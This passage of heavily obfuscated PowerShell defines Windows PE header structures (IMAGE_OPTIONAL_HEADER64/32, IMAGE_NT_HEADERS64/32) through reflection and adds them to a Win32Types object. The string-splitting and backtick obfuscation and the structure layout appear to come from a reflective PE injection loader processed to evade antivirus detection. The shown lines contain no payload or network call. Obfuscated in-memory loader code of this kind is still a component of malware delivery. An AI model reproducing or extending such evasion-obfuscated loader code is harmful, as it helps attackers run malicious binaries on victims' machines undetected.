		(${tY`pE`B`UiLdER}.("{0}{2}{3}{1}"-f'De','eld','f','ineFi').Invoke(("{2}{0}{3}{1}" -f 'ara','istics','DllCh','cter'), ${dlLChAra`C`TeR`I`s`TiC`sTyPE}, ("{1}{0}"-f'c','Publi'))).("{0}{1}"-f 'SetO','ffset').Invoke(70) | &("{0}{1}{2}" -f'Ou','t','-Null')
		(${TYPeB`U`IlDEr}.("{1}{2}{0}"-f 'ineField','D','ef').Invoke(("{1}{2}{4}{3}{0}" -f 'e','S','izeO','kReserv','fStac'), [UInt64], ("{1}{0}" -f 'ic','Publ'))).("{2}{0}{1}"-f 'Offse','t','Set').Invoke(72) | &("{1}{2}{0}" -f'ull','Out','-N')
		(${t`y`peBUiLd`er}.("{1}{2}{0}"-f'eField','Def','in').Invoke(("{3}{5}{4}{0}{1}{2}"-f'Co','mmi','t','S','ck','izeOfSta'), [UInt64], ("{2}{0}{1}" -f 'bl','ic','Pu'))).("{2}{1}{0}" -f 'set','etOff','S').Invoke(80) | &("{0}{1}{2}"-f'Out-','Nu','ll')
		(${tYPeBuI`L`DEr}.("{2}{0}{1}{3}"-f 'ef','ineFie','D','ld').Invoke(("{3}{4}{0}{2}{1}"-f 'eapRe','rve','se','S','izeOfH'), [UInt64], ("{1}{0}"-f 'ic','Publ'))).("{1}{2}{0}"-f 'fset','Se','tOf').Invoke(88) | &("{2}{1}{0}"-f 't-Null','u','O')
		(${t`ypEbUI`LDEr}.("{1}{2}{0}"-f'ld','Define','Fie').Invoke(("{4}{1}{2}{0}{3}" -f'm','e','OfHeapCo','mit','Siz'), [UInt64], ("{0}{1}" -f 'Pub','lic'))).("{2}{1}{0}"-f'set','ff','SetO').Invoke(96) | &("{0}{1}"-f 'Out','-Null')
		(${TypEB`Uild`er}.("{1}{0}{2}" -f 'e','Defin','Field').Invoke(("{0}{2}{1}" -f 'Loa','erFlags','d'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{0}{1}{2}" -f 'Se','tO','ffset').Invoke(104) | &("{2}{0}{1}"-f'Nul','l','Out-')
		(${ty`PebU`i`LDer}.("{1}{2}{0}{3}"-f 'e','Defin','eFi','ld').Invoke(("{0}{2}{4}{5}{1}{3}"-f 'Number','d','O','Sizes','f','RvaAn'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{0}{1}"-f'SetOf','fset').Invoke(108) | &("{1}{0}"-f 'ull','Out-N')
		(${TY`peBUi`LdEr}.("{2}{0}{1}{3}" -f'ef','in','D','eField').Invoke(("{2}{0}{1}"-f'portT','able','Ex'), ${iMag`E_DaTa_`dIReC`T`ORy}, ("{0}{1}" -f 'Publ','ic'))).("{1}{0}" -f 't','SetOffse').Invoke(112) | &("{1}{0}{2}" -f 't-N','Ou','ull')
		(${tY`P`EBuilD`er}.("{2}{0}{1}{3}"-f'e','Fi','Defin','eld').Invoke(("{0}{2}{1}" -f'I','able','mportT'), ${im`A`G`e_d`AtA_DIRectory}, ("{0}{1}{2}"-f'Publ','i','c'))).("{1}{0}{2}" -f'fs','SetOf','et').Invoke(120) | &("{0}{2}{1}"-f 'Out','ull','-N')
		(${t`Y`pebuil`Der}.("{2}{1}{3}{0}"-f'ield','e','D','fineF').Invoke(("{0}{2}{1}" -f'R','able','esourceT'), ${I`M`AGE_d`ATa_DIr`ECt`Ory}, ("{1}{0}" -f 'blic','Pu'))).("{0}{1}{2}" -f 'S','etOf','fset').Invoke(128) | &("{0}{1}"-f'Out','-Null')
		(${T`YpE`BU`ILdEr}.("{2}{0}{1}" -f'ne','Field','Defi').Invoke(("{3}{2}{0}{1}" -f'tion','Table','ep','Exc'), ${imA`Ge`_`DaTA_D`IrEcT`oRy}, ("{1}{0}"-f'lic','Pub'))).("{1}{0}"-f'fset','SetOf').Invoke(136) | &("{1}{0}{2}"-f'u','Out-N','ll')
		(${TypEB`UILD`Er}.("{3}{1}{2}{0}" -f'd','efineFi','el','D').Invoke(("{1}{2}{0}{4}{3}" -f'tif','C','er','Table','icate'), ${I`MAGE_d`At`A_`dIRECToRY}, ("{1}{0}"-f 'c','Publi'))).("{2}{0}{1}"-f 'etOffse','t','S').Invoke(144) | &("{1}{0}" -f 'ull','Out-N')
		(${ty`P`e`Builder}.("{0}{2}{3}{1}"-f 'De','d','fin','eFiel').Invoke(("{2}{4}{1}{0}{3}" -f'locati','Re','Bas','onTable','e'), ${I`MaGe_`dATa`_DiRec`To`Ry}, ("{2}{0}{1}"-f'bl','ic','Pu'))).("{0}{1}{2}"-f'SetO','ffs','et').Invoke(152) | &("{2}{0}{1}"-f 'ut-','Null','O')
		(${TY`pE`BUIL`dEr}.("{0}{3}{2}{1}"-f'D','Field','ne','efi').Invoke(("{0}{1}" -f'De','bug'), ${i`m`Age_DaT`A_DirE`CtoRY}, ("{1}{2}{0}"-f'c','P','ubli'))).("{0}{1}{2}{3}"-f'Set','O','ffse','t').Invoke(160) | &("{1}{2}{0}"-f'l','O','ut-Nul')
		(${ty`P`eb`UiLDER}.("{2}{0}{3}{1}"-f'efineFie','d','D','l').Invoke(("{2}{0}{3}{1}" -f 'ect','e','Archit','ur'), ${IMAg`E_dATa`_d`I`R`EcT`ory}, ("{1}{2}{0}"-f 'lic','Pu','b'))).("{1}{0}"-f 'fset','SetOf').Invoke(168) | &("{2}{0}{1}" -f'l','l','Out-Nu')
		(${TyP`eBUIL`Der}.("{0}{2}{1}"-f 'De','neField','fi').Invoke(("{0}{1}{2}"-f 'Gl','obal','Ptr'), ${imaGe_D`Ata_`dIr`e`cT`oRY}, ("{0}{2}{1}"-f 'Pu','c','bli'))).("{1}{2}{0}"-f'et','Set','Offs').Invoke(176) | &("{2}{1}{0}" -f 'ull','t-N','Ou')
		(${TYPE`B`UI`lder}.("{2}{1}{0}" -f'eField','in','Def').Invoke(("{0}{2}{1}" -f'T','le','LSTab'), ${imA`G`e_d`A`Ta_DIr`eCtory}, ("{1}{0}" -f 'lic','Pub'))).("{1}{0}{2}"-f'Of','Set','fset').Invoke(184) | &("{1}{0}{2}"-f 'N','Out-','ull')
		(${ty`p`ebuiL`DeR}.("{1}{0}{2}" -f'fineFiel','De','d').Invoke(("{1}{2}{3}{0}"-f 'e','Lo','adCo','nfigTabl'), ${Ima`GE_DAtA`_`di`REC`ToRy}, ("{1}{0}"-f'lic','Pub'))).("{0}{1}{2}" -f'S','etOffse','t').Invoke(192) | &("{1}{0}"-f't-Null','Ou')
		(${tYPEB`Ui`Lder}.("{2}{0}{1}"-f 'fi','neField','De').Invoke(("{0}{2}{1}" -f'Bou','ort','ndImp'), ${ImaGe_dA`TA_DIReCT`o`RY}, ("{0}{1}{2}"-f 'Pub','l','ic'))).("{1}{0}" -f 't','SetOffse').Invoke(200) | &("{0}{1}{2}"-f'O','ut-Nu','ll')
		(${tyP`e`BUIldER}.("{1}{2}{0}"-f'd','DefineFi','el').Invoke('IAT', ${I`M`AG`E_`dAT`A_dir`EcTory}, ("{1}{0}"-f 'c','Publi'))).("{1}{0}{2}"-f't','Se','Offset').Invoke(208) | &("{1}{0}"-f'l','Out-Nul')
		(${T`yPe`BUilD`Er}.("{0}{2}{1}" -f'D','ineField','ef').Invoke(("{3}{1}{2}{0}"-f'or','ay','ImportDescript','Del'), ${i`MaGe_da`Ta_DIReC`TO`Ry}, ("{0}{1}{2}"-f 'Pub','li','c'))).("{1}{0}" -f'ffset','SetO').Invoke(216) | &("{1}{2}{0}"-f 'ull','Out','-N')
		(${tYp`eB`U`ILDEr}.("{3}{0}{1}{2}"-f 'fi','neFiel','d','De').Invoke(("{3}{4}{1}{2}{0}"-f'imeHeader','Ru','nt','CL','R'), ${ImAgE_`dAT`A`_D`I`RecTory}, ("{0}{1}"-f 'Publi','c'))).("{1}{0}"-f 'set','SetOff').Invoke(224) | &("{1}{2}{0}"-f'ull','O','ut-N')
		(${tYp`EBUil`D`ER}.("{2}{0}{3}{1}" -f 'fi','d','De','neFiel').Invoke(("{2}{1}{0}"-f 'd','serve','Re'), ${iM`AG`e_DatA_Di`R`EcTORY}, ("{1}{0}" -f'ic','Publ'))).("{2}{1}{0}" -f'et','Offs','Set').Invoke(232) | &("{0}{2}{1}"-f 'O','l','ut-Nul')
		${i`ma`Ge_`Op`T`Iona`l_HeADER64} = ${ty`pebUi`L`DEr}.("{0}{1}{2}" -f 'Cre','ateTyp','e').Invoke()
		${wi`N3`2tyP`es} | &("{2}{0}{1}{3}" -f 'd','-Me','Ad','mber') -MemberType ("{2}{0}{1}"-f 'ePro','perty','Not') -Name ("{2}{3}{6}{5}{4}{1}{0}" -f'R64','HEADE','IM','AGE_','L_','ONA','OPTI') -Value ${i`mAgE_OPTIO`NaL_HeadE`R`64}

		
		${A`TtriB`U`TeS} = ("{9}{7}{8}{2}{3}{0}{5}{6}{1}{11}{4}{12}{10}" -f 'a','Ex','Cl','ass, Cl','citLayout, Sealed,','ss, Publ','ic, ','toLa','yout, Ansi','Au','nit','pli',' BeforeFieldI')
		${ty`p`Eb`UiLder} = ${MODUl`Eb`U`IlDER}.("{0}{1}{2}"-f 'Define','Typ','e').Invoke(("{4}{0}{3}{1}{2}"-f '_','N','AL_HEADER32','OPTIO','IMAGE'), ${AT`Tribu`T`eS}, [System.ValueType], 224)
		(${TYPEb`UiL`d`ER}.("{0}{1}{2}"-f'DefineF','i','eld').Invoke(("{0}{1}" -f'M','agic'), ${ma`gi`Cty`PE}, ("{2}{1}{0}"-f 'lic','ub','P'))).("{1}{0}"-f 't','SetOffse').Invoke(0) | &("{0}{1}" -f'Out-Nu','ll')
		(${ty`p`ebUI`lder}.("{2}{0}{1}" -f 'fin','eField','De').Invoke(("{4}{5}{3}{0}{2}{1}" -f 'e','Version','r','nk','Major','Li'), [Byte], ("{1}{0}"-f 'ublic','P'))).("{0}{2}{1}"-f'SetO','t','ffse').Invoke(2) | &("{1}{0}{2}" -f 'ut-N','O','ull')
		(${t`y`PebUIL`Der}.("{0}{3}{2}{1}" -f'Def','ield','F','ine').Invoke(("{4}{2}{0}{1}{5}{3}" -f'orLi','nk','n','rsion','Mi','erVe'), [Byte], ("{1}{0}"-f 'blic','Pu'))).("{0}{1}{2}" -f'SetO','ffs','et').Invoke(3) | &("{2}{0}{1}" -f't-Nul','l','Ou')
		(${T`yPEbUI`lDeR}.("{2}{0}{1}" -f'fin','eField','De').Invoke(("{0}{1}{2}" -f'SizeO','fC','ode'), [UInt32], ("{1}{0}{2}"-f 'b','Pu','lic'))).("{2}{0}{1}" -f't','Offset','Se').Invoke(4) | &("{0}{1}{2}"-f 'Ou','t-Nu','ll')
		(${T`y`peBU`ilDER}.("{1}{2}{3}{0}" -f 'eField','De','f','in').Invoke(("{6}{2}{4}{3}{1}{5}{0}" -f'dData','a','OfIni','i','t','lize','Size'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{1}{2}{0}"-f'ffset','Se','tO').Invoke(8) | &("{0}{2}{1}" -f 'Ou','l','t-Nul')
		(${TYp`eBUILD`er}.("{2}{1}{0}{3}"-f 'i','ineF','Def','eld').Invoke(("{5}{4}{1}{3}{2}{6}{0}" -f 'izedData','Of','it','Unin','ize','S','ial'), [UInt32], ("{1}{2}{0}"-f 'c','Publ','i'))).("{1}{2}{0}"-f 'Offset','Se','t').Invoke(12) | &("{1}{0}{2}" -f'ut-Nul','O','l')
		(${tY`pEbUi`lD`Er}.("{0}{2}{1}" -f'Defi','eField','n').Invoke(("{1}{5}{4}{0}{2}{3}"-f'essOfEnt','Ad','ryPoi','nt','r','d'), [UInt32], ("{1}{0}" -f'lic','Pub'))).("{1}{3}{2}{0}"-f 'ffset','Se','O','t').Invoke(16) | &("{1}{0}{2}"-f 'l','Out-Nu','l')
		(${TY`PE`Builder}.("{1}{0}{2}" -f'eF','Defin','ield').Invoke(("{1}{2}{0}"-f'e','BaseOfC','od'), [UInt32], ("{0}{1}" -f'P','ublic'))).("{0}{1}"-f'Se','tOffset').Invoke(20) | &("{1}{0}" -f 't-Null','Ou')
		(${TyPE`BuI`Ld`er}.("{2}{1}{0}" -f 'd','l','DefineFie').Invoke(("{2}{0}{1}" -f'aseOf','Data','B'), [UInt32], ("{0}{1}" -f'Pub','lic'))).("{1}{2}{3}{0}" -f'ffset','Se','t','O').Invoke(24) | &("{1}{0}{2}" -f't-Nu','Ou','ll')
		(${t`ypE`BUildER}.("{1}{0}{3}{2}" -f'neF','Defi','eld','i').Invoke(("{1}{0}{2}"-f 'eBas','Imag','e'), [UInt32], ("{0}{1}" -f'Publ','ic'))).("{0}{1}{2}"-f'Se','t','Offset').Invoke(28) | &("{1}{2}{0}"-f 'ull','O','ut-N')
		(${tY`pE`BUildeR}.("{0}{1}{2}{3}"-f'Def','i','neFi','eld').Invoke(("{2}{0}{3}{1}" -f'ign','t','SectionAl','men'), [UInt32], ("{0}{1}" -f'Publ','ic'))).("{0}{1}"-f 'SetOffs','et').Invoke(32) | &("{0}{1}{2}" -f 'O','ut-Nu','ll')
		(${typE`BU`ilD`er}.("{2}{3}{0}{1}"-f'el','d','Define','Fi').Invoke(("{0}{3}{1}{2}"-f'File','li','gnment','A'), [UInt32], ("{0}{2}{1}" -f 'P','c','ubli'))).("{2}{1}{0}" -f 't','se','SetOff').Invoke(36) | &("{2}{0}{1}" -f't','-Null','Ou')
		(${T`YpEbuI`lDEr}.("{1}{2}{0}" -f'eld','D','efineFi').Invoke(("{4}{2}{0}{1}{3}{5}"-f'atingSyste','m','per','V','MajorO','ersion'), [UInt16], ("{1}{0}"-f'ic','Publ'))).("{0}{1}"-f 'SetO','ffset').Invoke(40) | &("{0}{2}{1}"-f'O','t-Null','u')
		(${TYPebUI`L`dER}.("{3}{1}{0}{2}"-f 'Fie','efine','ld','D').Invoke(("{3}{2}{5}{1}{6}{0}{4}"-f'mV','y','erat','MinorOp','ersion','ingS','ste'), [UInt16], ("{1}{0}"-f 'lic','Pub'))).("{2}{0}{1}" -f'ff','set','SetO').Invoke(42) | &("{0}{1}" -f'Ou','t-Null')
		(${TY`pEbU`Il`DeR}.("{2}{1}{0}"-f'd','fineFiel','De').Invoke(("{0}{1}{2}{3}" -f 'Majo','r','Ima','geVersion'), [UInt16], ("{0}{1}" -f'Publ','ic'))).("{1}{0}{2}"-f 'etOffse','S','t').Invoke(44) | &("{2}{0}{1}" -f'-','Null','Out')
		(${t`yPE`BUIldEr}.("{0}{2}{1}"-f 'De','ineField','f').Invoke(("{0}{1}{3}{2}"-f 'MinorImageVe','r','n','sio'), [UInt16], ("{1}{0}" -f 'blic','Pu'))).("{0}{2}{1}" -f 'Se','et','tOffs').Invoke(46) | &("{2}{1}{0}"-f 'ull','N','Out-')
		(${typ`e`BUi`ldEr}.("{1}{0}{3}{2}"-f'fin','De','d','eFiel').Invoke(("{4}{0}{3}{1}{2}" -f 'jorSubsyste','e','rsion','mV','Ma'), [UInt16], ("{0}{1}{2}" -f'Pu','bl','ic'))).("{1}{2}{0}" -f't','Se','tOffse').Invoke(48) | &("{2}{0}{1}"-f 'ut-N','ull','O')
		(${ty`peBUIL`dEr}.("{2}{0}{1}" -f'fineF','ield','De').Invoke(("{2}{3}{6}{4}{1}{5}{0}" -f'mVersion','ubsy','M','in','S','ste','or'), [UInt16], ("{2}{0}{1}"-f'ubli','c','P'))).("{2}{1}{0}"-f'ffset','tO','Se').Invoke(50) | &("{2}{0}{1}" -f '-','Null','Out')
		(${Ty`PEBui`ld`Er}.("{2}{1}{3}{0}"-f 'neField','ef','D','i').Invoke(("{1}{3}{0}{2}"-f 'rsi','Win3','onValue','2Ve'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{0}{3}{2}{1}"-f'Se','t','fse','tOf').Invoke(52) | &("{1}{0}" -f 'll','Out-Nu')
		(${TypEB`UI`lDER}.("{2}{1}{0}"-f 'd','iel','DefineF').Invoke(("{2}{1}{3}{0}" -f 'age','eO','Siz','fIm'), [UInt32], ("{1}{0}" -f'ublic','P'))).("{2}{0}{1}"-f 'etOf','fset','S').Invoke(56) | &("{1}{0}" -f 't-Null','Ou')
		(${tyP`EbUI`LDER}.("{2}{1}{0}"-f 'fineField','e','D').Invoke(("{3}{0}{1}{4}{2}"-f 'Of','H','aders','Size','e'), [UInt32], ("{0}{1}{2}" -f'P','ub','lic'))).("{0}{1}"-f'S','etOffset').Invoke(60) | &("{1}{0}" -f'-Null','Out')
		(${t`ypebUIL`d`ER}.("{1}{0}{2}" -f 'e','Defin','Field').Invoke(("{0}{1}"-f 'Check','Sum'), [UInt32], ("{1}{0}" -f'lic','Pub'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(64) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
		(${T`ypebU`IlD`er}.("{2}{1}{0}" -f 'eld','efineFi','D').Invoke(("{1}{0}{2}" -f'te','Subsys','m'), ${SU`BSY`sTE`Mt`YPe}, ("{0}{1}" -f 'Publ','ic'))).("{2}{0}{1}" -f'Off','set','Set').Invoke(68) | &("{0}{2}{1}" -f 'Out','ll','-Nu')
		(${tY`PE`BUIldER}.("{1}{2}{3}{0}"-f'd','De','fineFie','l').Invoke(("{3}{1}{5}{4}{0}{2}"-f'ri','C','stics','Dll','e','haract'), ${dllc`HaraC`TerIs`TIcstY`pe}, ("{2}{1}{0}"-f 'c','i','Publ'))).("{0}{1}"-f 'SetOf','fset').Invoke(70) | &("{0}{1}" -f 'Ou','t-Null')
		(${tYpEBU`i`L`DEr}.("{0}{1}{3}{2}"-f'D','efin','eld','eFi').Invoke(("{2}{1}{3}{0}" -f'serve','ze','Si','OfStackRe'), [UInt32], ("{0}{1}{2}" -f 'Pub','l','ic'))).("{1}{0}"-f'etOffset','S').Invoke(72) | &("{1}{0}{2}" -f'-Nul','Out','l')
		(${T`y`p`ebuIlDER}.("{2}{3}{1}{0}" -f'd','l','Define','Fie').Invoke(("{4}{0}{1}{3}{2}" -f'OfS','tack','t','Commi','Size'), [UInt32], ("{0}{1}"-f'P','ublic'))).("{1}{0}{2}" -f 'fse','SetOf','t').Invoke(76) | &("{2}{0}{1}" -f '-N','ull','Out')
		(${T`YPEbU`I`Lder}.("{2}{1}{0}"-f 'd','eFiel','Defin').Invoke(("{0}{5}{3}{1}{4}{2}"-f 'SizeOfH','s','ve','pRe','er','ea'), [UInt32], ("{0}{1}"-f'Publi','c'))).("{0}{2}{1}"-f 'Set','et','Offs').Invoke(80) | &("{1}{0}{2}" -f'ut-','O','Null')
		(${t`YpEB`UIl`dEr}.("{1}{3}{0}{2}"-f'i','D','eld','efineF').Invoke(("{4}{1}{3}{2}{0}"-f'pCommit','e','Hea','Of','Siz'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{2}{0}{1}" -f'O','ffset','Set').Invoke(84) | &("{1}{2}{0}" -f 'ull','Out-','N')
		(${tYpE`BUi`LDER}.("{0}{1}{2}" -f'De','fin','eField').Invoke(("{0}{1}{3}{2}"-f 'Loader','Fl','gs','a'), [UInt32], ("{1}{0}"-f'ublic','P'))).("{0}{2}{3}{1}" -f 'S','t','etO','ffse').Invoke(88) | &("{0}{2}{1}" -f 'O','-Null','ut')
		(${ty`PEBUiLD`er}.("{2}{3}{1}{0}" -f'd','neFiel','Def','i').Invoke(("{2}{1}{3}{0}" -f 'Sizes','vaAn','NumberOfR','d'), [UInt32], ("{1}{0}{2}"-f 'ubl','P','ic'))).("{2}{1}{0}"-f'set','tOff','Se').Invoke(92) | &("{0}{1}" -f'Out-Nul','l')
		(${t`yPebuiL`d`er}.("{0}{2}{1}"-f'Def','eField','in').Invoke(("{2}{3}{0}{1}" -f'r','tTable','Ex','po'), ${iMage_DAtA_`Di`R`ECTO`RY}, ("{0}{1}"-f 'P','ublic'))).("{1}{0}{2}" -f'etOffse','S','t').Invoke(96) | &("{1}{2}{0}" -f'ull','Ou','t-N')
		(${tYPEbui`L`d`eR}.("{1}{2}{0}"-f 'd','DefineF','iel').Invoke(("{2}{0}{1}"-f 'portTa','ble','Im'), ${im`A`gE_d`AtA_diR`ecTo`Ry}, ("{1}{0}"-f 'c','Publi'))).("{0}{3}{2}{1}" -f'S','et','fs','etOf').Invoke(104) | &("{1}{0}"-f 'll','Out-Nu')
		(${T`yPEBUi`ld`eR}.("{2}{0}{1}"-f'l','d','DefineFie').Invoke(("{1}{2}{3}{0}" -f 'e','Reso','urceT','abl'), ${ImAgE`_dAt`A_DiRe`CtO`RY}, ("{1}{0}" -f'blic','Pu'))).("{1}{0}" -f 'set','SetOff').Invoke(112) | &("{0}{2}{1}" -f 'Out','Null','-')
		(${t`YPEbUiLD`ER}.("{3}{0}{1}{2}"-f 'e','Fiel','d','Defin').Invoke(("{0}{3}{4}{2}{1}" -f 'Ex','Table','ion','c','ept'), ${imag`E`_DA`Ta_DIRecTORY}, ("{0}{1}"-f'Publi','c'))).("{0}{1}" -f 'Se','tOffset').Invoke(120) | &("{1}{0}{2}"-f 't-','Ou','Null')
		(${TyPe`B`U`ILdEr}.("{0}{1}{2}" -f 'Defin','eFi','eld').Invoke(("{4}{3}{2}{1}{0}"-f'le','ab','ateT','ic','Certif'), ${I`magE`_Data_DIRE`CTo`Ry}, ("{1}{2}{0}"-f 'c','Pub','li'))).("{1}{2}{0}" -f 't','Set','Offse').Invoke(128) | &("{1}{2}{0}"-f'ull','Out-','N')
		(${tYp`EbuIL`dER}.("{2}{3}{0}{1}"-f'i','eld','Defi','neF').Invoke(("{5}{4}{3}{2}{1}{0}"-f'ble','a','nT','o','ti','BaseReloca'), ${iMage_daT`A_`DirecT`o`Ry}, ("{0}{1}"-f 'Pu','blic'))).("{0}{2}{1}"-f'Set','fset','Of').Invoke(136) | &("{1}{2}{0}"-f 'l','Ou','t-Nul')
		(${tYPeb`U`I`LDer}.("{3}{0}{2}{1}"-f 'efineFi','ld','e','D').Invoke(("{0}{1}" -f 'De','bug'), ${imA`gE_`DAtA_dI`REc`T`o`RY}, ("{1}{2}{0}"-f'ic','P','ubl'))).("{2}{1}{0}"-f'ffset','etO','S').Invoke(144) | &("{2}{0}{1}" -f'u','t-Null','O')
		(${typEbU`I`Ld`eR}.("{1}{2}{0}" -f'd','Defi','neFiel').Invoke(("{0}{1}{3}{2}" -f 'Arch','ite','ture','c'), ${i`mA`G`E_data_d`I`RECtoRY}, ("{0}{1}"-f 'Pub','lic'))).("{0}{2}{1}"-f'Set','et','Offs').Invoke(152) | &("{2}{1}{0}" -f 'Null','-','Out')
		(${TY`PEbuIL`Der}.("{2}{0}{1}{3}"-f'e','l','DefineFi','d').Invoke(("{0}{1}{2}" -f'Gl','obalP','tr'), ${im`AGe`_Da`TA_`DirecToRY}, ("{0}{2}{1}"-f'Pu','c','bli'))).("{1}{0}{2}"-f 'f','SetO','fset').Invoke(160) | &("{2}{0}{1}" -f'-N','ull','Out')
		(${tYpe`BuiL`D`Er}.("{0}{2}{1}" -f 'De','Field','fine').Invoke(("{0}{1}"-f 'TLSTa','ble'), ${i`maGe_DaT`A_d`I`RECtORy}, ("{0}{2}{1}"-f'Pub','ic','l'))).("{2}{0}{1}"-f 'etOffs','et','S').Invoke(168) | &("{0}{1}{2}"-f 'Out-','Nul','l')
		(${TYP`eBU`I`ldER}.("{0}{1}{2}" -f 'De','f','ineField').Invoke(("{0}{3}{2}{4}{1}" -f'Lo','ble','f','adCon','igTa'), ${IMaGe_`dAt`A_d`Ir`eCtORy}, ("{1}{0}{2}"-f'i','Publ','c'))).("{1}{0}"-f 'ffset','SetO').Invoke(176) | &("{0}{1}"-f 'Out','-Null')
		(${T`y`p`eBUiLDEr}.("{2}{1}{0}{3}" -f 'neFie','i','Def','ld').Invoke(("{2}{3}{0}{1}"-f 'undIm','port','B','o'), ${i`maGE_`d`ATA_dI`ReCt`O`RY}, ("{0}{1}" -f 'Pu','blic'))).("{1}{2}{0}" -f 'set','Se','tOff').Invoke(184) | &("{0}{1}{2}" -f 'Ou','t-Nul','l')
		(${tYpE`BuI`L`dEr}.("{3}{2}{1}{0}"-f 'd','Fiel','ne','Defi').Invoke('IAT', ${imaGe_dAt`A_`d`ir`eC`TORY}, ("{0}{1}"-f 'P','ublic'))).("{1}{0}" -f'etOffset','S').Invoke(192) | &("{2}{0}{1}"-f '-Nul','l','Out')
		(${type`Bu`ilD`ER}.("{1}{0}{2}" -f 'ie','DefineF','ld').Invoke(("{4}{0}{2}{1}{3}"-f'ortDe','to','scrip','r','DelayImp'), ${Ima`GE_`Dat`A_D`IrEctory}, ("{0}{1}" -f'Publ','ic'))).("{2}{1}{0}"-f 't','ffse','SetO').Invoke(200) | &("{1}{2}{0}" -f 'll','Out-','Nu')
		(${TYp`eBu`ilDER}.("{1}{0}{2}"-f'eFie','Defin','ld').Invoke(("{2}{3}{4}{1}{0}"-f'er','timeHead','C','LRR','un'), ${im`Age_DaTa_D`I`RE`CT`o`RY}, ("{1}{0}" -f'c','Publi'))).("{2}{0}{1}" -f'ffs','et','SetO').Invoke(208) | &("{0}{1}" -f'Out','-Null')
		(${tY`P`Ebuil`der}.("{0}{2}{3}{1}" -f'De','eld','fine','Fi').Invoke(("{1}{0}{2}" -f 'eserve','R','d'), ${imAge_`Da`Ta_dIre`ctorY}, ("{2}{1}{0}"-f'lic','ub','P'))).("{1}{0}{2}"-f'tO','Se','ffset').Invoke(216) | &("{1}{0}" -f 'ull','Out-N')
		${i`m`AgE_opT`iOn`AL`_HEAder32} = ${T`ypEBuI`LdER}.("{2}{1}{0}" -f'pe','eTy','Creat').Invoke()
		${WiN`3`2TyPeS} | &("{0}{1}{2}" -f'Add-Mem','be','r') -MemberType ("{1}{0}{2}" -f 'otePropert','N','y') -Name ("{0}{1}{4}{3}{2}"-f 'IMAGE_OP','TIONAL','R32','HEADE','_') -Value ${im`Ag`E_opTIO`NAL`_hEaDer`32}

		
		${atTriBu`T`es} = ("{19}{7}{14}{15}{12}{11}{13}{0}{8}{3}{17}{20}{9}{21}{10}{2}{18}{16}{6}{5}{1}{4}"-f' Public','i','yout,',' Se','t','dIn','reFiel','a',',','ia','a',', Clas','ass','s,','yout',', AnsiCl',' Befo','q',' Sealed,','AutoL','uent','lL')
		${tYPe`BU`IL`dEr} = ${MO`dUL`e`BUILDeR}.("{2}{0}{1}" -f'Typ','e','Define').Invoke(("{1}{0}{2}{3}"-f'AGE_','IM','NT_HEADE','RS64'), ${aTtRib`UT`ES}, [System.ValueType], 264)
		${TYPeB`U`IL`DeR}.("{2}{0}{1}"-f'ie','ld','DefineF').Invoke(("{1}{2}{0}"-f'e','Sign','atur'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{0}{1}{2}"-f'Out-N','u','ll')
		${TYPE`Bu`ILder}.("{1}{2}{0}"-f'ield','D','efineF').Invoke(("{0}{2}{1}" -f'File','ader','He'), ${imag`E_f`ILe`_Hea`der}, ("{2}{1}{0}"-f'c','ubli','P')) | &("{1}{2}{0}" -f'ull','Out-','N')
		${typ`eB`Uild`ER}.("{2}{3}{1}{0}"-f 'ld','e','D','efineFi').Invoke(("{3}{1}{4}{0}{2}" -f 'onalHe','pt','ader','O','i'), ${iMaGe`_OpTIONA`l_`hEader`64}, ("{0}{1}" -f'Publ','ic')) | &("{2}{0}{1}" -f 't-N','ull','Ou')
		${iM`A`ge_nT_he`ADERS64} = ${Typ`EbuIl`D`Er}.("{0}{1}{2}"-f'C','reateTyp','e').Invoke()
		${wIN`32TyP`es} | &("{2}{0}{1}"-f'd','-Member','Ad') -MemberType ("{3}{2}{0}{1}"-f 'rt','y','ope','NotePr') -Name ("{0}{1}{3}{4}{2}" -f'IMA','GE_N','64','T_','HEADERS') -Value ${ImAG`e_N`T`_He`ADerS`64}
		
		
		${a`Tt`RiBuTEs} = ("{13}{6}{11}{0}{16}{1}{3}{8}{15}{17}{2}{12}{10}{5}{9}{14}{4}{7}" -f' ','siCl','Se','ass, Cl','ed, BeforeFieldIni','t,','La','t','ass',' S','entialLayou','yout,','qu','Auto','eal',', P','An','ublic, ')
		${TyP`EBU`IL`der} = ${MODule`B`Uil`Der}.("{1}{0}{2}" -f 'eTyp','Defin','e').Invoke(("{3}{2}{0}{1}{4}" -f'_NT_','HE','MAGE','I','ADERS32'), ${ATtR`IbuT`ES}, [System.ValueType], 248)
		${typ`E`BUI`LdeR}.("{0}{1}{2}"-f'Def','i','neField').Invoke(("{1}{0}{2}" -f'natu','Sig','re'), [UInt32], ("{2}{1}{0}"-f 'c','li','Pub')) | &("{2}{0}{1}"-f't-Nu','ll','Ou')
		${Ty`peBuI`L`DER}.("{0}{1}{3}{2}"-f 'DefineF','i','ld','e').Invoke(("{0}{2}{3}{1}" -f'Fi','er','leH','ead'), ${iM`A`gE_filE_HEa`d`er}, ("{0}{1}"-f 'P','ublic')) | &("{2}{1}{0}" -f'l','Nul','Out-')
		${TYp`Eb`UI`ldeR}.("{2}{3}{1}{0}" -f'd','el','De','fineFi').Invoke(("{0}{2}{3}{4}{1}" -f'Op','er','t','io','nalHead'), ${I`mA`Ge_`OpT`IO`NaL_HeA`Der32}, ("{0}{1}" -f'P','ublic')) | &("{2}{0}{1}"-f'N','ull','Out-')
		${Im`AGE_`NT_`h`eA`DeRs32} = ${T`yPebUi`L`deR}.("{2}{0}{3}{1}" -f'rea','eType','C','t').Invoke()
		${W`iN32t`yPes} | &("{1}{2}{0}" -f'er','Add-M','emb') -MemberType ("{2}{0}{3}{1}"-f 'ro','rty','NoteP','pe') -Name ("{2}{5}{1}{3}{4}{0}" -f '2','E_N','I','T_HEAD','ERS3','MAG') -Value ${ImAgE_`N`T_headEr`s32}

		
		${A`TtR`IBUtES} = ("{10}{5}{4}{1}{0}{3}{13}{6}{2}{12}{11}{8}{9}{7}" -f ', SequentialLay','Class, Public','led','out,','t, AnsiClass, ','you','ea','nit','e','ldI','AutoLa','foreFi',', Be',' S')
